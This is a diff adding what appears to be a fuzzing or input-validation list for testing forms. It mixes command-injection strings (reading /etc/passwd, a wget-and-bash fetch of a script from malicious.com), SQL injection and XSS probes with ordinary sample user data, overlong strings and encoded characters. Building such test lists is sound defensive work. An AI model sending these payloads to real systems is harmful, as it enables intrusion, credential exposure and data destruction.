@@ -1,0 +1,65 @@
+;ls -la
+| cat /etc/passwd
+&& echo 'Command executed'
+;wget malicious.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh
+$(sleep 5)
+' OR 1=1 --
+1'; DROP TABLE users; --
+'; EXEC xp_cmdshell('ping 127.0.0.1'); --
+1' UNION SELECT null, @@version, null, null; --
+1' OR SLEEP(5) --
+;ls
+;whoami
+& cat /etc/passwd
+| ls
+;ping -c 4 127.0.0.1
+' OR '1'='1
+1' OR '1'='1'--
+' OR 'x'='x
+1; DROP TABLE users; --
+1' UNION SELECT 1, 'admin', 'password', 1 --
+alert('XSS')
+<script>123</script>
+JohnDoe
+Secure123
+johndoe@example.com
+30
+USA
+NewYork
+10001
+user
+en_US
+GMT
+USD
+123-456-7890
+premium
+active
+male
+Jane
+Doe
+123 Main St
+Engineer
+Example Inc.
+Bachelor's Degree
+Traveling
+Gold
+1990-05-15
+trully
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
+123 Main St
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+EngineerEngineerEngineerEngineerEngineerEngineer
+Example IncExample IncExample IncExample IncExample IncExample Inc.
+Example IncExample IncExample IncExample IncExample IncExample Inc.
+Example IncExample IncExample IncExample IncExample IncExample Inc.
+Example IncExample IncExample IncExample IncExample IncExample Inc.
+%u0038%u0038%u0038/
+%25252532%25252532%25252532%25252532
+%u0103%u0103%u0103%u0103
